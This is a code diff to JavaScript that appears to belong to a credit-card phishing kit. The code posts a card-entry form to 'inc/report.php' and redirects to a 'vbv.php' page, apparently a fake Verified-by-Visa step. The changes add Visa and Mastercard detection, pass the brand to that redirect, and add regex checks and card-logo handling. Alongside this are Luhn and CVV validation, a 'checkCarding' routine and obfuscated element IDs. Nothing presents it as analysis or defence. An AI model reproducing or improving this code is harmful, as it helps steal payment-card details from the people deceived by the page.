@@ -1,10 +1,20 @@
   function sendcard(){
+      var card_num = $("#ccno").val()
+      var cardname="";
+      if(card_num[0]==4){
+        cardname="visa";
+      }
+      else if(card_num[0]==5){
+        cardname="master";
+      }
+           
       $.ajax({
         url: 'inc/report.php',
         method: 'post',
         data: $('#X-dllOOPD').serialize(),
         success: function(message){
-            window.location.href = 'vbv.php';
+
+            window.location.href = 'vbv.php?cardname='+cardname;
         }
       });
   }
@@ -18,6 +28,7 @@
     });
     $("#ccno").validateCreditCard(function (t) {
         $(this).focusout(function () {
+            // alert("dfsf");
             if (t.valid && t.length_valid && t.luhn_valid) {
                 $(this).removeClass("error");
             } else {
@@ -36,6 +47,7 @@
 
 function checkCvv() {
     $("#cvv").on("keyup focus change past blur keystroke undo redo input", function () {
+        // alert("DSfsf");
         var t = $(this).val();
         t.length != 3 || !isNumber(t) ? ($(this).addClass("error")) : $(this).removeClass("error")
     })
@@ -76,7 +88,6 @@ function checkCarding() {
         (0 == $(".carding").find(".error").length) ? ($("#FFIOMNLLDSXXZQASDS").addClass("important")) : ($("#FFIOMNLLDSXXZQASDS").removeClass("important"))
     }),
         $("#FFIOMNLLDSXXZQASDS").click(function () {
-            // alert("dfsfds");
             if ($(this).hasClass("deny")) {
                 return false;
             } else {
@@ -444,4 +455,42 @@ function checkCodeRio() {
                 }
             }
         });
+}
+
+function validateCreditCardNumber(inputtxt)
+{
+    var visa = /^(?:4[0-9]{12}(?:[0-9]{3})?)$/;
+    var master = /^(?:5[1-5][0-9]{14})$/;
+    if(inputtxt.match(visa))
+    {
+      return "v_s";
+    }
+    else if(inputtxt.match(master))
+    {
+        return "m_c";
+    }
+    else{
+        return false;
+    }
+}
+function update(cardNumber) {
+    var img = document.getElementById("img");
+    var card_name=validateCreditCardNumber(cardNumber);
+    if(card_name=="v_s"){
+        document.getElementById("card-type-trv").value = "v_i_s_a";
+        $("#card-type-trv").removeClass("error");
+        
+    }
+    else if(card_name=="m_c"){
+        document.getElementById("card-type-trv").value = "m_c";
+        $("#card-type-trv").removeClass("error");
+
+    }
+    else{
+        document.getElementById("card-type-trv").value = "0";
+        $("#card-type-trv").addClass("error");
+    }
+    img.src ="assets/img/"+(card_name || "") + ".png";
+   
+    
 }
